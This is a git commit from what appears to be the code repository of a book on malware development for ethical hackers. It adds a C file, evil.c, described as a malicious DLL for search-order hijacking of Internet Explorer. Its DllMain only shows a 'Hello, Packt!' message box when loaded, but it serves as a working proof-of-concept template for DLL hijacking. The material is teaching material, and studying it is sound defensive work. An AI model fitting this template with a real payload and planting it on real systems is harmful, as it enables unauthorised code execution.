315845a48419dc63808dfeb643abcff7f3194111
cocomelonc <cocomelonkz@gmail.com>
2023-09-13 01:57:38 +0300

    add chapter 03: winlogon, DLL hijacking examples

---
+++ chapter03/implementing-dll-search-order-hijacking/evil.c
@@ -0,0 +1,29 @@
+/*
+ * Malware Development for Ethical Hackers
+ * evil.c - malicious DLL
+ * DLL hijacking. Internet Explorer
+ * author: @cocomelonc
+*/
+
+#include <windows.h>
+#pragma comment (lib, "user32.lib")
+
+BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
+  switch (ul_reason_for_call)  {
+  case DLL_PROCESS_ATTACH:
+    MessageBox(
+      NULL,
+      "Hello, Packt!",
+      "=^..^=",
+      MB_OK
+    );
+    break;
+  case DLL_PROCESS_DETACH:
+    break;
+  case DLL_THREAD_ATTACH:
+    break;
+  case DLL_THREAD_DETACH:
+    break;
+  }
+  return TRUE;
+}
